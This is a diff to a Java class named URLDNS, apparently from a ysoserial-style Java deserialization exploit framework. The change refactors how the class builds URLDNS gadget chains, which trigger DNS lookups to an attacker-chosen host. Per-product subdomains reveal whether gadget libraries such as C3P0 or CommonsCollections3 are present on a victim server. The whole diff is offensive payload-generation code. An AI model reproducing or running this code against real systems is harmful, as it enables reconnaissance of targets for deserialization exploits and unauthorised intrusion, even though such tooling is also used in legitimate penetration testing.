@@ -37,12 +37,11 @@ public class URLDNS implements ObjectPayload<Object> {
     public static void main(String[] args) throws Exception {
         DNSHelper dnsHelper = new DNSHelper();
         dnsHelper.setHost("");
-        ArrayList<String> products = new ArrayList<String>();
-//        products.add("all");
-//        products.add("CommonsCollections3");
-//        products.add("CommonsCollections4");
-//        products.add("bcel");
-//        products.add("c3p0");
+        Product[] products = new Product[]{
+                Product.C3P0,
+                Product.CommonsCollections3,
+        };
+
         dnsHelper.setProducts(products);
 
 //        dnsHelper.setClassName("com.ppp.KickOffn");
@@ -50,9 +49,6 @@ public class URLDNS implements ObjectPayload<Object> {
 
         SinksHelper sinksHelper = new SinksHelper();
         sinksHelper.setDnsHelper(dnsHelper);
-        Object object = new URLDNS().getObject(sinksHelper);
-//        String s = Serializer.serializeBase64(object);
-//        System.out.println(s);
 
 
         PayloadRunner.run(URLDNS.class, dnsHelper);
@@ -68,56 +64,99 @@ public class URLDNS implements ObjectPayload<Object> {
 
     public Object getChainScheduler(DNSHelper dnsHelper) throws Exception {
         Object kickOffObject = null;
+        String host = dnsHelper.getHost();
+        String className = dnsHelper.getClassName();
+        String subdomain = dnsHelper.getSubdomain();
 
-        ArrayList<String> products = dnsHelper.getProducts();
 
-        if (products == null || products.isEmpty()) {
-            Printer.blueInfo("No product specified, using default URLDNS gadget");
-            kickOffObject = getChain(hostFormat(dnsHelper.getHost(), null));
-        } else if (dnsHelper.getClassName() != null && dnsHelper.getSubdomain() != null) {
-            String subdomain = dnsHelper.getSubdomain();
-            String className = dnsHelper.getClassName();
-            Class clazz = getClass(className);
-            Object kick = getChain(hostFormat(dnsHelper.getHost(), subdomain), clazz);
-            kickOffObject = kick;
-            Printer.yellowInfo(String.format("Subdomain: %s  -->  Custom Class: %s", subdomain, className));
-        } else {
-            // 导入全部
-            if (products.get(0).equalsIgnoreCase("all")) {
-                Product[] values = Product.values();
-                ArrayList<String> tproducts = new ArrayList<String>();
-                for (Product value : values) {
-                    tproducts.add(value.getLongProduct());
-                }
-                products = tproducts;
-            }
+        if (host == null) {
+            Printer.error("Host is empty");
+        }
 
-            Printer.blueInfo("Detect products: " + products);
+        Product[] products = dnsHelper.getProducts();
+        if (products.length != 0) {
             List<Object> kickList = new LinkedList<Object>();
-            for (String product : products) {
-                Product productEnum = Product.getProduct(product);
-                if (productEnum == null) {
-                    continue;
-                }
+            for (Product product : products) {
                 for (Subdomain subdomainEnum : Subdomain.values()) {
-                    if (subdomainEnum.getProduct().equalsIgnoreCase(productEnum.getLongProduct())) {
-                        String subdomain = subdomainEnum.getSubdomain();
-                        String className = subdomainEnum.getClassName();
+                    if (subdomainEnum.getProduct().equals(product.getLongProduct())) {
+                        String subdomainEnumSubdomain = subdomainEnum.getSubdomain();
+                        String subdomainEnumClassName = subdomainEnum.getClassName();
                         try {
-                            Class clazz = getClass(className);
+                            Class clazz = getClass(subdomainEnumClassName);
                             if (clazz != null) {
-                                Object kick = getChain(hostFormat(dnsHelper.getHost(), subdomain), clazz);
+                                Object kick = getChain(hostFormat(host, subdomainEnumSubdomain), clazz);
                                 kickList.add(kick);
                             }
                         } catch (Exception e) {
 
                         }
-                        Printer.yellowInfo(String.format("Subdomain: %s  -->  Class: %s", subdomain, className));
+                        Printer.yellowInfo(String.format("Subdomain: %s  -->  Class: %s", subdomainEnumSubdomain, subdomainEnumClassName));
                     }
                 }
             }
             kickOffObject = kickList;
+        } else if (className != null) {
+            Printer.yellowInfo(String.format("Subdomain: %s  -->  Custom Class: %s", subdomain, className));
+            Class clazz = getClass(className);
+            if (subdomain == null) {
+                Printer.blueInfo("No subdomain specified, using host " + host);
+            }
+            kickOffObject = getChain(hostFormat(dnsHelper.getHost(), subdomain), clazz);
+        } else {
+            Printer.blueInfo("No product specified, using default URLDNS gadget");
+            kickOffObject = getChain(hostFormat(host, null));
         }
+
+
+//        ArrayList<String> products = dnsHelper.getProducts();
+//
+//        if (products == null || products.isEmpty()) {
+//            Printer.blueInfo("No product specified, using default URLDNS gadget");
+//            kickOffObject = getChain(hostFormat(dnsHelper.getHost(), null));
+//        } else if (dnsHelper.getClassName() != null && dnsHelper.getSubdomain() != null) {
+//            String subdomain = dnsHelper.getSubdomain();
+//            String className = dnsHelper.getClassName();
+//            Class clazz = getClass(className);
+//            Object kick = getChain(hostFormat(dnsHelper.getHost(), subdomain), clazz);
+//            kickOffObject = kick;
+//            Printer.yellowInfo(String.format("Subdomain: %s  -->  Custom Class: %s", subdomain, className));
+//        } else {
+//            // 导入全部
+//            if (products.get(0).equalsIgnoreCase("all")) {
+//                Product[] values = Product.values();
+//                ArrayList<String> tproducts = new ArrayList<String>();
+//                for (Product value : values) {
+//                    tproducts.add(value.getLongProduct());
+//                }
+//                products = tproducts;
+//            }
+//
+//            Printer.blueInfo("Detect products: " + products);
+//            List<Object> kickList = new LinkedList<Object>();
+//            for (String product : products) {
+//                Product productEnum = Product.getProduct(product);
+//                if (productEnum == null) {
+//                    continue;
+//                }
+//                for (Subdomain subdomainEnum : Subdomain.values()) {
+//                    if (subdomainEnum.getProduct().equalsIgnoreCase(productEnum.getLongProduct())) {
+//                        String subdomain = subdomainEnum.getSubdomain();
+//                        String className = subdomainEnum.getClassName();
+//                        try {
+//                            Class clazz = getClass(className);
+//                            if (clazz != null) {
+//                                Object kick = getChain(hostFormat(dnsHelper.getHost(), subdomain), clazz);
+//                                kickList.add(kick);
+//                            }
+//                        } catch (Exception e) {
+//
+//                        }
+//                        Printer.yellowInfo(String.format("Subdomain: %s  -->  Class: %s", subdomain, className));
+//                    }
+//                }
+//            }
+//            kickOffObject = kickList;
+//        }
 
         return kickOffObject;
     }
